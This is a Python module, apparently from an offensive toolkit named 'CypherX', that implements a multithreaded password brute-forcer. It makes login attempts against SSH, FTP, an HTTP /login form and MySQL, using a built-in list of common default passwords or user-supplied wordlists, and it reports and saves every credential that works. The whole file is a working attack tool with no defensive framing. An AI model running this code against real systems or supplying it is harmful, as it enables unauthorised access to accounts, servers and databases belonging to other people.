#!/usr/bin/env python3

import os
import json
import threading
from queue import Queue
from datetime import datetime
from typing import Optional, List

from rich.console import Console
from rich import box

console = Console()

DEFAULT_PORTS = {"ssh":22,"ftp":21,"smtp":25,"rdp":3389,"mysql":3306,"http":80}
DEFAULT_PASS  = ["admin","password","123456","root","toor","pass","1234","admin123","test","guest"]


class BruteForce:
    def __init__(self, timeout: int = 10, quiet: bool = False):
        self.timeout = timeout
        self.quiet   = quiet
        self._found  = []
        self._lock   = threading.Lock()

    def _ssh(self, host: str, port: int, user: str, password: str) -> bool:
        try:
            import paramiko
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(host, port=port, username=user, password=password,
                      timeout=self.timeout, allow_agent=False, look_for_keys=False)
            c.close()
            return True
        except Exception:
            return False

    def _ftp(self, host: str, port: int, user: str, password: str) -> bool:
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=self.timeout)
            ftp.login(user, password)
            ftp.quit()
            return True
        except Exception:
            return False

    def _http(self, host: str, port: int, user: str, password: str) -> bool:
        try:
            import requests
            r = requests.post(
                f"http://{host}:{port}/login",
                data={"username": user, "password": password},
                timeout=self.timeout, allow_redirects=True, verify=False
            )
            return r.status_code in (200, 302) and "logout" in r.text.lower()
        except Exception:
            return False

    def _mysql(self, host: str, port: int, user: str, password: str) -> bool:
        try:
            import pymysql
            conn = pymysql.connect(host=host, port=port, user=user,
                                   password=password, connect_timeout=self.timeout)
            conn.close()
            return True
        except Exception:
            return False

    def _attempt(self, protocol: str, host: str, port: int, user: str, password: str) -> bool:
        handlers = {"ssh": self._ssh, "ftp": self._ftp, "http": self._http, "mysql": self._mysql}
        handler  = handlers.get(protocol)
        if not handler:
            return False
        return handler(host, port, user, password)

    def run(self, protocol: str, target: str, port: Optional[int] = None,
            userlist: Optional[str] = None, passlist: Optional[str] = None,
            user: str = "admin", limit: int = 1000, threads: int = 10,
            output_dir: str = "results", save_json: bool = False):
        from core.security import guard
        target   = guard.sanitize(target, "target")
        port     = port or DEFAULT_PORTS.get(protocol, 80)
        users    = [user]
        passwords = DEFAULT_PASS

        if userlist and os.path.exists(userlist):
            with open(userlist) as f:
                users = [l.strip() for l in f if l.strip()]
        if passlist and os.path.exists(passlist):
            with open(passlist) as f:
                passwords = [l.strip() for l in f if l.strip()]

        passwords = passwords[:limit]
        q         = Queue()

        for u in users:
            for p in passwords:
                q.put((u, p))

        console.print(f"\n  [*] Brute: {protocol}://{target}:{port}  attempts={q.qsize()}  limit={limit}")

        def worker():
            while not q.empty():
                try:
                    u, p = q.get_nowait()
                    if not self.quiet:
                        console.print(f"  [dim]trying {u}:{p}[/dim]", end="\r")
                    if self._attempt(protocol, target, port, u, p):
                        with self._lock:
                            self._found.append({"user": u, "password": p})
                            console.print(f"\n  [green]✓ FOUND[/green]  {u}:{p}")
                except Exception:
                    pass
                finally:
                    q.task_done()

        ts = [threading.Thread(target=worker, daemon=True) for _ in range(min(threads, 20))]
        for t in ts:
            t.start()
        for t in ts:
            t.join()

        if self._found:
            console.print(f"\n  [green]✓[/green]  {len(self._found)} credential(s) found")
        else:
            console.print(f"\n  No credentials found.")

        payload = {
            "tool":      "CypherX",
            "target":    f"{protocol}://{target}:{port}",
            "scan_time": datetime.now().isoformat(),
            "found":     self._found,
        }

        if save_json:
            os.makedirs(output_dir, exist_ok=True)
            path = os.path.join(output_dir,
                f"brute_{target}_{protocol}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            with open(path,"w") as f:
                json.dump(payload, f, indent=4)
            console.print(f"  [green]✓[/green]  Saved → {path}")

        console.print(f"\n  CypherX  |  brute {protocol} {target}\n")
        return payload
